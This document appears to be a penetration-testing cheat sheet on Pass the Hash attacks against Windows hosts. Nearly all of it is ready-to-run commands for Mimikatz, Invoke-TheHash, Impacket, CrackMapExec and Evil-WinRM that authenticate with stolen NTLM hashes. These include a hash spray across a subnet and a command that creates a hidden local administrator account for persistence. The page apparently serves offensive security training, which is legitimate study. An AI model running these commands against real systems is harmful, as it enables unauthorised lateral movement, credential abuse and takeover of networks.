A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication.
# Windows 
## Mimikatz
For perform this techniques from a Windows Host we can use [Mimikatz](https://github.com/gentilkiwi).
```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /rc4:<HASH> /domain:<domain> /run:cmd.exe" exit
```

We can use _/NTLM_ opposite to _/rc4_
## Invoke-TheHash
Another tool we can use to perform Pass the Hash attacks on Windows is [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash).
This tool is a collection of PowerShell functions for performing Pass the Hash attacks with _WMI_ and _SMB_.
Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer. 
```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <IP> -Domain <Domain> -Username <Users> -Hash <Hash> -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
# Linux 
## Impacket
[Impacket](https://github.com/SecureAuthCorp/impacket) has several tools we can use for different operations such as `Command Execution` and `Credential Dumping`, `Enumeration`, etc.
```bash
impacket-psexec <User>@<IP> -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:
- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)
## NXC
```bash
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command.
## Evil-Winrm
```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

With Domain Account:
```bash
evil-winrm -i 10.129.201.126 -u administrator@<Domain> -H 30B3783CE2ABF1AF70F77D0660CF3453
```